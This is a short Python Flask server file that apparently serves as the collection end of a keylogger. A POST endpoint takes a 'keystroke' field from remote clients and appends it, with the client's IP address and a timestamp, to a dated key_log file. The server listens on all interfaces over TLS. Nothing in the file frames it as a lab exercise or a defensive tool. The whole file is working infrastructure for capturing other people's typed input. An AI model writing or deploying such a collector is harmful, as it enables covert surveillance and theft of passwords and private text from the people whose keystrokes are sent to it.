from flask import Flask, request
import datetime
import os

app = Flask(__name__)

# Generate a log file name with the current date and time
start_time = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
log_filename = f"logs/key_log_{start_time}.txt"

os.makedirs("logs", exist_ok=True)

@app.route('/log', methods=['POST'])
def log_key():
    keystroke = request.form['keystroke']
    client_ip = request.remote_addr
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    log_entry = f"[{timestamp}] {client_ip} - Keystroke: {keystroke}"
    print(log_entry)
    
    with open(log_filename, "a") as log:
        log.write(f"{log_entry}\n")
    
    return '', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, ssl_context=('certs/cert.pem', 'certs/key.pem'))
